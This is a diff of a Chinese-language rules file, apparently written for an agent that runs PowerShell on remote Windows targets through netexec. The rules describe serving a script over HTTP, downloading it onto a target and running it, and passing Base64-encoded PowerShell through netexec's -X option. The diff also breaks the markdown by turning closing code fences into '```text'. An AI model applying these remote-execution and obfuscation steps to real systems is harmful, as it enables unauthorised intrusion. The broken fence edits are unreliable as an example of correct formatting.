@@ -22,20 +22,20 @@ metadata: { domain: tools, tier: T3 }
 
 ## 规则 2: 文件大小 → Get-ChildItem
 
-```
+```text
 # ✅ 正确: (锁定文件也能读)
 (Get-ChildItem "C:\path\file.exe").Length
 
 # ❌ 错误: (锁定文件返回 0)
 (Get-Item "C:\path\file.exe").Length
-```
+```text
 
 ## 规则 3: 复杂脚本 → 先写文件
 
-```
+```text
 1. HTTP serve script → Invoke-WebRequest download to target
 2. Start-Process powershell -File local.ps1
-```
+```text
 
 ## 规则 4: 必须内联 → Base64
 
@@ -43,13 +43,13 @@ metadata: { domain: tools, tier: T3 }
 CMD='while($true){...}'
 B64=$(echo -n "$CMD" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)
 netexec ... -X "powershell -NoP -EncodedCommand $B64"
-```
+```text
 
 ## 规则 5: 变量 → 单引号包裹
 
 ```bash
 netexec ... -X '"$var"'   # 单引号内 $ 不被 bash 展开
-```
+```text
 
 ## 执行前检查
 
